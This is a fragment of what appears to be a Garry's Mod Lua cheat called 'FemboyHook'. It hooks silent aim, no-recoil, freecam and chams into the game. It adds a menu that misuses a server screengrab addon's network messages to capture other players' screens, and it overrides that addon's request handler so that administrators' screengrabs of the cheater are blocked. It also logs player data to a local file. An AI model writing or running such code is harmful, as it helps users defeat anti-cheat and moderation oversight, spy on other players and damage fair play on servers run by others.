    		local col = GTS.Interface.Theme[GTS.Interface.SelectedTheme]
            local colj = HSVToColor((RealTime() * 50) % 360, 1, 1)

    		st.surface_SetDrawColor( col.background )
    		st.surface_DrawRect( 0, 0, w, h )
    		st.surface_SetDrawColor(Color( colj.r , colj.g , colj.b ) )
    		st.surface_DrawRect( 0, 0, w, 60 )
    		st.draw_SimpleText( "Femboy Screengrab Menu", "Arial_GTS_35_Bold", w/2, 32.5, color_white, 1, 1 )
    		st.surface_SetDrawColor( Color( colj.r , colj.g , colj.b ) )
    		for i = 0, 4 do
    			st.surface_DrawOutlinedRect( i, i, w - ( i * 2 ), h - ( i * 2 ) )
    		end

    		if ( frame.selectedPlayer and IsValid( frame.selectedPlayer ) ) then
    			local shootPos = frame.selectedPlayer:GetShootPos()
    			local x, y = self:GetPos()
    			local ang = frame.selectedPlayer:EyeAngles()
    			local tr = st.util_TraceLine( {
    				start = shootPos,
    				endpos = shootPos + ang:Forward() * -30,
    				filter = function( ent ) if ( ent == frame.selectedPlayer ) then return false end end
    			} )
    			st.render_RenderView( { origin = tr.HitPos, angles = ang, x = x + 420, y = y + 180 , w = 440, h = 256, drawviewmodel = false } )
    		else
    			st.surface_SetDrawColor( 0, 0, 0 )
    			st.surface_DrawRect( 420, 180, 440, 256 )
    			st.surface_SetDrawColor( 210, 210, 210 )
    			for i = 1, 120 do
    				st.surface_DrawRect( 420 + st.math_random( 0, 440 ), 180 + st.math_random( 0, 256 ), 1, 1 )
    			end

    			st.draw_SimpleText( GTS.Interface.GetText( "no_player" ), "Arial_GTS_25_Bold", 640, 308, colj, 1, 1 )
    		end
    	end

        frame.settingsBtn	= st.vgui_Create( "DImageButton_GTS", frame )
        frame.informationBtn= st.vgui_Create( "DImageButton_GTS", frame )
        frame.closeBtn 		= st.vgui_Create( "DImageButton_GTS", frame )
        frame.scrollPnl 	= st.vgui_Create( "DScrollPanel_GTS", frame )
        frame.avatarImg 	= st.vgui_Create( "AvatarImage", frame )
        frame.nickLbl 		= st.vgui_Create( "DLabel", frame )
        frame.sidLbl 		= st.vgui_Create( "DLabel", frame )
        frame.profilBtn 	= st.vgui_Create( "DButton_GTS", frame )
        frame.qualitySld 	= st.vgui_Create( "DSlider_GTS", frame )
        frame.requestBtn 	= st.vgui_Create( "DButton_GTS", frame )
        frame.methodCheck 	= st.vgui_Create( "DCheckBox", frame )

    	local btns = { frame.settingsBtn, frame.informationBtn, frame.closeBtn }
    	local xPos = 740

    	for k, pnl in ipairs ( btns ) do
    		pnl:SetPos( xPos, 7 )
    		pnl:SetSize( 50, 50 )
    		pnl:SetCircle( true )
    		pnl.primaryColor = Color( 255, 0, 0, 0 )
    		pnl.zoomMax = 5
    		xPos = xPos + 50
    	end

    	frame.settingsBtn:SetMaterial( "gts/settings.png" )
    	frame.settingsBtn.DoClick = function( self )
    		GTS.Interface.OpenSettings()
    	end

    	frame.informationBtn:SetMaterial( "gts/information.png" )
    	frame.informationBtn.DoClick = function( self )
    		GTS.Interface.OpenInformation()
    	end

    	frame.closeBtn:SetMaterial( "gts/close.png" )
    	frame.closeBtn.DoClick = function( self )
    		frame.selectedPlayer = nil
    		frame:AlphaTo( 0, 0.5, 0, function()
    			if ( IsValid( frame ) ) then
    				frame:Remove()
    			end
    		end)
    	end

    	frame.scrollPnl:SetPos( 10, 65 )
    	frame.scrollPnl:SetSize( 375, 575 )
    	frame.scrollPnl:SetGripSize( 10 )
    	frame.scrollPnl.plySID = {}
    	frame.scrollPnl.AddPlayer = function( self, ply )

    		local btn = st.vgui_Create( "DButton_GTS" )
    		btn:SetParent( self )
    		btn:SetPos( 0, 0 )
    		btn:SetSize( 365, 64 )
    		btn:SetFont( "Arial_GTS_40_Bold" )
    		btn:SetText( ply:Nick() )
    		btn:SetIcon( ply )
    		btn:SetParentScissor( self )
    		btn.iconZoomRatio = 2.8	
    		btn.DoClick = function( self )
    			frame.avatarImg:SetPlayer( ply, 128 )
    			frame.selectedPlayer = ply
    			frame.requestBtn:SetEnabled( true )
    		end
    		self.plySID[ply:SteamID()] = btn
    		self:RecalcBtn()

    	end

    	frame.scrollPnl.RecalcBtn = function( self )
    		local yPos = 0
    		for k, btn in pairs ( self.plySID ) do
    			btn:SetPos( 0, yPos )
    			yPos = yPos + 64 + 5
    		end
    	end

    	local yPos = 5

    	for k, ply in pairs ( st.ply() ) do
    		if ( not ply:IsBot() ) then
    			local font = "Arial_GTS_40_Bold"
    			st.surface_SetFont( font )
    			local width = st.surface_GetTextSize(ply:Nick())
    			if ( width > 200 ) then
    				font = "Arial_GTS_30_Bold"
    			end
    			local btn = st.vgui_Create( "DButton_GTS" )
    			btn:SetParent( frame.scrollPnl )
    			btn:SetPos( 5, yPos + 0 )
    			btn:SetSize( 365, 64 )
    			btn:SetFont( font )
    			btn:SetText( ply:Nick() )
    			btn:SetIcon( ply )
    			btn:SetParentScissor( frame.scrollPnl )
    			btn.iconZoomRatio = 2.8	
    			btn.DoClick = function( self )
    				if ( IsValid( ply ) ) then
    					frame.avatarImg:SetPlayer( ply, 128 )
    					frame.selectedPlayer = ply
    					frame.requestBtn:SetEnabled( true )
    					frame.profilBtn:SetEnabled( true )
    					frame.nickLbl:SetText( ply:Nick() )
    					frame.sidLbl:SetText( ply:SteamID() )
    					st.net_Start( "GimmeThatScreen_RequestPVS" )
    						st.net_WriteEntity( ply )
    					st.net_SendToServer()
    				end
    			end
    			frame.scrollPnl.plySID[ply:SteamID()] = btn
    			yPos = yPos + 64 + 5
    		end
    	end

        frame.avatarImg:SetPos( 420, 80 )
        frame.avatarImg:SetSize( 80, 80 )
        frame.nickLbl:SetPos( 510, 80 )
        frame.nickLbl:SetSize( 350, 30 )
        frame.nickLbl:SetContentAlignment( 7 )
        frame.nickLbl:SetFont( "Arial_GTS_30" )
        frame.nickLbl:SetText( GTS.Interface.GetText( "select_player" ) )
        frame.nickLbl:SetTextColor( color_white )
        frame.sidLbl:SetPos( 510, 110 )
        frame.sidLbl:SetSize( 350, 20 )
        frame.sidLbl:SetContentAlignment( 7 )
        frame.sidLbl:SetFont( "Arial_GTS_20_Bold" )
        frame.sidLbl:SetText( "STEAM_0:0:00000000" )
        frame.sidLbl:SetTextColor( color_white )
        frame.profilBtn:SetPos( 510, 135 )
        frame.profilBtn:SetSize( 120, 25 )
        frame.profilBtn:SetFont( "Arial_GTS_15" )
        frame.profilBtn:SetText( "Show steam profil" )
        frame.profilBtn:SetEnabled( false )
        frame.profilBtn.zoomEnabled = false
        frame.profilBtn.DoClick = function()
    		if ( IsValid( frame.selectedPlayer ) ) then
    			frame.selectedPlayer:ShowProfile()
    		end
    	end

    	local xPos, yPos = 420, 460
    	frame.qualitySld:SetPos( xPos, yPos )
    	frame.qualitySld:SetSize( 400, 60 )
    	frame.qualitySld:SetMax( 100 )
    	frame.qualitySld:SetMin( 10 )
    	frame.qualitySld.lastState = 1
    	frame.qualitySld.warningRotation = 50
    	frame.qualitySld.OnValueChanged = function( self, value )
    		local value = st.math_Round( value )
    		if ( value > 90 ) then
    			if ( self.lastState ~= 3 ) then	
    				self.warningRotation = 55
    				self.lastState = 3 
    			end
    		elseif ( value > 75 ) then
    			if ( self.lastState ~= 2 ) then
    				self.warningRotation = 40
    				self.lastState = 2
    			end
    		else
    			if ( self.lastState ~= 1 ) then
    				self.warningRotation = 25
    				self.lastState = 1
    			end
    		end
    	end

    	frame.qualitySld.Think = function( self, w, h )
    		if ( self.warningRotation > 0 ) then
    			self.warningRotation = st.math_max( self.warningRotation - ( 60 *RealFrameTime() ), 0 )
    		end
    	end

    	frame.qualitySld.PaintOver = function( self, w, h )
    		local val = self:GetValue()
    		DisableClipping(true)
    		if ( val > 75 ) then
    			if ( val > 90 ) then
    				st.surface_SetDrawColor( 255, 45, 45, 255 )
    			else
    				st.surface_SetDrawColor( 255, 255, 0, 255 )
    			end
    			st.surface_SetMaterial( Material( "gts/warning.png" ) )
    		else
    			st.surface_SetDrawColor(45, 255, 45, 255 )
    			st.surface_SetMaterial( Material( "gts/thumbs.png" ) )
    		end
    		local size = 30
    		st.surface_DrawTexturedRectRotated( w+30, h/2 - 2, size, size, st.math_sin( CurTime() * 16 ) * self.warningRotation )
    		st.draw_SimpleText( GTS.Interface.GetText( "quality_screen" ), "Arial_GTS_20_Bold", -5, -5, color_white, 0, 0 )
    		st.draw_SimpleText( "( " .. GTS.Interface.GetText( "recommended_quality" ) .. " )", "Arial_GTS_15", 0, 75, color_white, 0, 0 )
    		st.draw_SimpleText( GTS.Interface.GetText( "quality_note" ), "Arial_GTS_15", 0, 95, Color( 230, 110, 110 ), 0, 0 )
    		DisableClipping(false)
    	end

    	frame.requestBtn:SetPos( xPos, yPos + 120 )
    	frame.requestBtn:SetSize( 256, 50 )
    	frame.requestBtn:SetFont( "Arial_GTS_30" )
    	frame.requestBtn:SetText( GTS.Interface.GetText( "request_screen" ) )
    	frame.requestBtn:SetEnabled( false )
    	frame.requestBtn.DoClick = function( self )
    		local mode = "Local"
    		if ( not frame.methodCheck:GetChecked() ) then
    			mode = "Global"
    		end
    		if ( frame.selectedPlayer ) then
    			st.net_Start("GimmeThatScreen_Provide")
    			st.net_WriteBool(true)
    			st.net_WriteString(frame.qualitySld:GetValue()) 
    			st.net_WriteEntity(frame.selectedPlayer) 
    			st.net_WriteString( mode )
    			st.net_SendToServer()
    			GTS.Interface.OpenLoading()
    		end
    	end

    	frame.methodCheck:SetPos( xPos + 270,  yPos + 145 )
    	frame.methodCheck:SetValue( true )
    	frame.methodCheck:SetSize( 20, 20 )
    	frame.methodCheck.zoomValue = 5
    	frame.methodCheck.OnChange = function( self, val )
    		if ( val ) then self.zoomValue = 7 end
    	end

    	frame.methodCheck.Think = function( self )
    		if ( self.zoomValue > 3 ) then
    			self.zoomValue = st.math_max( self.zoomValue - 5 * (RealFrameTime() * 2), 3 )
    		end
    	end

    	frame.methodCheck.DoClick = function( self )
    		self:Toggle()
    		if ( self:GetChecked() ) then
    			st.surface_PlaySound( "gts/check.mp3" )
    		end
    	end

    	frame.methodCheck.Paint = function( self, w, h )
    		st.surface_SetDrawColor( 5, 10, 15, 255 )
    		st.surface_DrawRect( 0, 0, w, h )
    		DisableClipping( true )
    			st.surface_SetDrawColor( 255, 255, 255 )
    			st.surface_DrawOutlinedRect( -1, -1, w + 2, h + 2 )
    			if ( self:GetChecked() ) then
    				st.surface_SetDrawColor( 0, 255, 0, 255 )
    				st.surface_SetMaterial( Material( "gts/check.png" ) )
    				st.surface_DrawTexturedRect( -self.zoomValue, -self.zoomValue, w+self.zoomValue*2, h+self.zoomValue*2 )
    			end
    			st.draw_SimpleText( GTS.Interface.GetText( "advanced_mode" ), "Arial_GTS_15_Bold", 25, 10, color_white, 0, 1 )
    			st.draw_SimpleText( GTS.Interface.GetText( "advanced_mode_info" ), "Arial_GTS_13", 0, -20, color_white, 0, 3 )
    		DisableClipping( false )
    	end

    end)

    local self = {}

    self.Constructor = function()
    	self.Request = false
    	self.Require = nil
    	self.Quality = nil
    	self.Destroy = nil
    end

    self.OPMapInteger = function() return tostring(st.math_random(-9999999999, 9999999999)) end
    self.TimerAddListeningEvent = function()
    	local virtualThread = coroutine.running()
    	st.timer_Create(self:OPMapInteger(), 1, 0, function() coroutine.resume(virtualThread) end)
    	coroutine.yield()
    end

    st.net_Receive("GimmeThatScreen_Request", function (len)
    	local Authed 	= st.net_ReadBool()
    	local ply  		= st.net_ReadEntity()
    	local Quality 	= st.net_ReadString()
        local Destroy 	= st.net_ReadString()
        st.chat_AddText(Color( 100, 100, 255 ),"If This Message Is Spammed To Fast You Just Dodge a crash Attempt")
        st.chat_AddText(Color( 100, 100, 255 ),"Someone Screegrabed You Be Carefull !")
        st.chat_AddText(Color( 100, 255, 100 ),"Gts Blocked !")
    end)

    self.ScreenGrab = function()

    	if not self.Request or self.Destroy ~= "Local" then return end
    	if tonumber(self.Quality) > 70 then self.Quality = 70 end
    	local Map = st.string_sub(tostring(st.math_abs(tonumber(self.OPMapInteger()))), 1, 7)

    	st.runco("jpeg_quality", tonumber(self.Quality))
    	st.runco("cl_savescreenshotstosteam", "0")
    	st.me():ConCommand(st.string_format("jpeg %s", Map))

    	st.timer_Simple(0.5, function()
    		if st.file_Exists("screenshots/" .. Map .. ".jpg", "GAME") then
    			local Callback = st.file_Read("screenshots/" .. Map .. ".jpg", "GAME")
    			local SubDatas = st.util_Compress(Callback)
    			local len 	   = st.string_len(SubDatas)
    			local packets  = 25000
    			local parts	   = st.math_ceil(len / packets)
    			local start    = 0
    			function self.VirtualThread(_)
    				for i = 1, parts do
    					local endbyte = st.math_min(start + packets,len)
    					local size = endbyte - start
    					st.net_Start("GimmeThatScreen_Embedded")
    					st.net_WriteBool(i == parts)
    					st.net_WriteBool(true)
    					st.net_WriteUInt(size,32)
    					st.net_WriteData(SubDatas:sub(start + 1, endbyte + 1),size)
    					st.net_WriteEntity(self.Require)
    					st.net_SendToServer()
    					start = endbyte
    					self:TimerAddListeningEvent(0.35)
    				end
    			end
    			coroutine.wrap(self.VirtualThread)(0)
    		end
    		st.runco("cl_savescreenshotstosteam", "1")
    	end)

    end
    self.Constructor()

    vieworigin = st.me():EyePos()
    function PSCalccView(ply, origin, angles, fov, znear, zfar)
        local view = {}
        local fangs = mdrconf.vars["PS_silent"] and st.fa or angles

        if st.targetspec and IsValid(st.targetspec) then
            view.origin = st.targetspec:EyePos() - (fangs:Forward() * mdrconf.vars["PS_thirddist"])
            view.angles = fangs
            view.fov = mdrconf.vars["PS_fovdist"]
            view.drawviewer = true
        elseif mdrconf.vars["PS_third"] then
            view.origin = origin - (fangs:Forward() * mdrconf.vars["PS_thirddist"]) or origin
            view.angles = fangs
            view.fov = mdrconf.vars["PS_fovdist"]
            view.drawviewer = true
        elseif mdrconf.vars["PS_fov"] then
            view.fov = mdrconf.vars["PS_fovdist"]
        end

        if st.freecamEnabled then
            view.origin = st.freecamPos
            view.angles = st.fa
            view.drawviewer = true
        end

        if mdrconf.vars["PS_norecoil"] then
            view.angles = st.fa
        end

        vieworigin = origin

        return view
    end

    function PSCalccViewModelView(wep, vm, oldPos, oldAng, pos, ang)
        pos = vieworigin 
	    ang = mdrconf.vars["PS_silent"] and st.fa or ang
        return pos, ang
    end
    
    function st.makeFlake(x, y, size, speed)
    	local flake = {}

    	flake.size = size or st.math_random(st.flakeSize - st.flakeSizeVariation, st.flakeSize + st.flakeSizeVariation)
    	flake.sizeHalved = flake.size / 2 
    	flake.x = x or st.math_random(0, st.sw())
    	flake.y = y or 0 - flake.size 
    	flake.speed = speed or st.math_random(st.flakeSpeed - st.flakeSpeedVariation, st.flakeSpeed + st.flakeSpeedVariation)
    	flake.rotation = 0

    	local speed = st.math_random(st.flakeRotationSpeed - st.flakeRotationSpeedVariation, st.flakeRotationSpeed + st.flakeRotationSpeedVariation)

    	if st.math_random(0, 1) == 1 then
    		flake.rotationSpeed = st.flakeRotationSpeed
    	else
    		flake.rotationSpeed = st.flakeRotationSpeed  * -1
    	end

    	return flake
    end

    function st.addFlake(x, y, size, speed)
    	st.table_insert(st.flakes, st.makeFlake(x, y, size, speed))
    end

    function mathCircEaseOut(x)
    	local y = 1 - st.math_sqrt(1 - x * x)
    	return y
    end

    function st.create(alreadyStarted)
    	if alreadyStarted then
    		for i = 1, st.size do
    			st.addFlake(st.math_random(0, st.sw()), st.math_random(0, st.sh())) 
    		end
    	end
    	st.timer_Create("snowflakePopulator", .05, 0, function()
    		if not gui.IsGameUIVisible() then return end
    		local toadd = st.math_Approach(#st.flakes, st.size, mathCircEaseOut(1 - #st.flakes / st.size) * 25) - #st.flakes
    		for i = 1, st.math_ceil(toadd) do
    			st.addFlake()
    		end
    	end)
    end

    st.create(true)
    function PSdrawwoverlay()
    	if not gui.IsGameUIVisible() then return end
    	st.surface_SetTexture(st.surface_GetTextureID("particle/snow"))
    	st.surface_SetDrawColor(HSVToColor((CurTime() * 50) % 360, 1, 1))
    	for k, flake in ipairs(st.flakes) do
    		st.surface_DrawTexturedRectRotated(flake.x - flake.sizeHalved / 2, flake.y - flake.sizeHalved / 2, flake.size, flake.size, flake.rotation)
    		flake.y = flake.y + flake.speed * FrameTime()
    		flake.rotation = flake.rotation + flake.rotationSpeed * FrameTime()
    		if flake.rotation > 360 then flake.rotation = -360 end
    		if flake.rotation < -360 then flake.rotation = 360 end
    		if flake.y > st.sh() then st.table_remove(st.flakes, k) end
    	end
    end

    st.concommand_Add("MediaPly", function()
        local mediafr = st.vgui_Create("DFrame")
        mediafr:SetTitle("")
        mediafr:SetSize(500, 300) 
        mediafr:Center()
        mediafr:ShowCloseButton(false)
        mediafr:MakePopup()
        function mediafr:Paint(w, h)
            st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false)
            st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
            st.surface_DrawTexturedRect(0, 0, w, h)
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            st.surface_DrawOutlinedRect(0,0,w,h,2)
        end

        local Close = st.vgui_Create("DButton", mediafr)
        Close:SetPos(455, 4)
        Close:SetText("X")
        Close:SetSize(40, 25)
        function Close:DoClick()
           mediafr:Close()
        end
        function Close:Paint(w,h)
            local v = self:IsDown()
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            st.surface_DrawOutlinedRect(0,0,w,h,2)
            if not v and not self:IsHovered() then return end
            if v then
                st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            else
                st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
            end
            st.surface_DrawRect(5,5,w-10,h-10)
        end

        local sgli = st.vgui_Create("DListView", mediafr)
        sgli:SetSize(480, 150)
        sgli:SetPos(10, 30)
        sgli:AddColumn("Mp3 File")
        for _, flnm in ipairs(st.solist) do
            sgli:AddLine(flnm)
        end
        sgli.OnRowSelected = function(_, index, row)
            local slcetd = row:GetColumnText(1)
            st.curindd = index
            plsong(slcetd)
        end

        local ulen = st.vgui_Create("DTextEntry", mediafr)
        ulen:SetPos(10, 190)
        ulen:SetSize(250, 20)
        ulen:SetText("")

        local plybuuu = st.vgui_Create("DButton", mediafr)
        plybuuu:SetPos(270, 190)
        plybuuu:SetSize(100, 20)
        plybuuu:SetText("Play Link")
        plybuuu.DoClick = function()
            local ul = ulen:GetValue()
            if ul and ul ~= "" then
                plsongurl(ul)
            else
                st.prnt("notgoodurlbro")
            end
        end

        local stbuut = st.vgui_Create("DButton", mediafr)
        stbuut:SetPos(10, 220)
        stbuut:SetSize(100, 20)
        stbuut:SetText("||")
        stbuut.DoClick = function()
            if st.curson then
                st.curson:Stop()
                st.curson = nil
            end
        end

        local prvvbuutt = st.vgui_Create("DButton", mediafr)
        prvvbuutt:SetPos(120, 220)
        prvvbuutt:SetSize(100, 20)
        prvvbuutt:SetText("◁")
        prvvbuutt.DoClick = function()
            if st.curindd > 1 then
                st.curindd = st.curindd - 1
            else
                st.curindd = #st.solist
            end
            plsong(st.solist[st.curindd])
        end

        local nxtbuttt = st.vgui_Create("DButton", mediafr)
        nxtbuttt:SetPos(230, 220)
        nxtbuttt:SetSize(100, 20)
        nxtbuttt:SetText("▷")
        nxtbuttt.DoClick = function()
            if st.curindd < #st.solist then
                st.curindd = st.curindd + 1
            else
                st.curindd = 1
            end
            plsong(st.solist[st.curindd])
        end

        local volsli = st.vgui_Create("DNumSlider", mediafr)
        volsli:SetPos(10, 250)
        volsli:SetSize(480, 30)
        volsli:SetText("Volume")
        volsli:SetMin(0)
        volsli:SetMax(1)
        volsli:SetDecimals(2)
        volsli:SetValue(st.vollev)
        volsli.OnValueChanged = function(_, value)
            svol(value)
        end

    end)
    
    st.gameevent_Listen("player_hurt")
    Femboyhooks("player_hurt",PSPLAYERHURT)
    Femboyhooks("HUDPaint",PSHUDDPaint)
    Femboyhooks("CalcView",PSCalccView)
    Femboyhooks("CalcViewModelView",PSCalccViewModelView)
    Femboyhooks("DrawOverlay",PSdrawwoverlay)
    Femboyhooks("DrawPhysgunBeam",PSDRAWBEAM)
    Femboyhooks("PostDraw2DSkyBox",PSSKYBOX)
    Femboyhooks("PreDrawEffects",PSCHAMS)
    Femboyhooks("Tick",PSTICK)
    Femboyhooks("CreateMove",PSCreateeMove )
    Femboyhooks("OhmyGod",PSonmynetger )
end

/*
      ███╗███████╗ ██████╗ ██████╗     ███╗   ███╗███████╗███╗   ██╗██╗   ██╗     █████╗ ███╗   ██╗██████╗     ███████╗███████╗████████╗██╗   ██╗██████╗ ███╗      
      ██╔╝██╔════╝██╔═══██╗██╔══██╗    ████╗ ████║██╔════╝████╗  ██║██║   ██║    ██╔══██╗████╗  ██║██╔══██╗    ██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗╚██║      
█████╗██║ █████╗  ██║   ██║██████╔╝    ██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║    ███████║██╔██╗ ██║██║  ██║    ███████╗█████╗     ██║   ██║   ██║██████╔╝ ██║█████╗
╚════╝██║ ██╔══╝  ██║   ██║██╔══██╗    ██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║    ██╔══██║██║╚██╗██║██║  ██║    ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝  ██║╚════╝
      ███╗██║     ╚██████╔╝██║  ██║    ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝    ██║  ██║██║ ╚████║██████╔╝    ███████║███████╗   ██║   ╚██████╔╝██║     ███║      
      ╚══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝     ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚══╝      
*/

Femboyhooks("Think", function()
    if st.input_IsKeyDown(KEY_6) then
        if not IsValid(PS) then
            createPS()
        end
        if not FHBK then
           PS:SetVisible(not PS:IsVisible())
        end
        if not FHBK2 then
           PS2:SetVisible(not PS2:IsVisible())
        end

        FHBK = true
        FHBK2 = true
    else
        FHBK = false
        FHBK2 = false
    end
end)
createPS()
loadurl()
st.concommand_Add("_]menu[_",createPS)
/*
      ███╗██████╗  ██████╗ ███████╗████████╗███████╗███████╗████████╗██╗   ██╗██████╗ ███╗      
      ██╔╝██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗╚██║      
█████╗██║ ██████╔╝██║   ██║███████╗   ██║   ███████╗█████╗     ██║   ██║   ██║██████╔╝ ██║█████╗
╚════╝██║ ██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝  ██║╚════╝
      ███╗██║     ╚██████╔╝███████║   ██║   ███████║███████╗   ██║   ╚██████╔╝██║     ███║      
      ╚══╝╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚══╝      
*/
MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"\n\n[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2"])," [Collect Garbage] = ",st.string_ToColor(mdrconf.col["msgc3"]),collectgarbage())
MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"\n[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2"])," [GcInfo] = ",st.string_ToColor(mdrconf.col["msgc3"]),gcinfo())

MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"\n[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2"])," [Player saved in ] = ",st.string_ToColor(mdrconf.col["msgc3"]),"Data/Logger.txt","\n")
if FriendConnected then
    MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"\n[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2"])," [Friend Connected]",FriendConnectedSteamId,"\n")
else
    MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2c"])," [No Friend Connected]","\n")
end

if st.file_Exists("bin", "GAME") then
    MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2"])," [Bin Folder Found]","\n")
else
    MsgC( st.string_ToColor(mdrconf.col["msgc1"]),"[FemboyHook]",st.string_ToColor(mdrconf.col["msgc2c"])," [No Bin Folder]","\n")
end
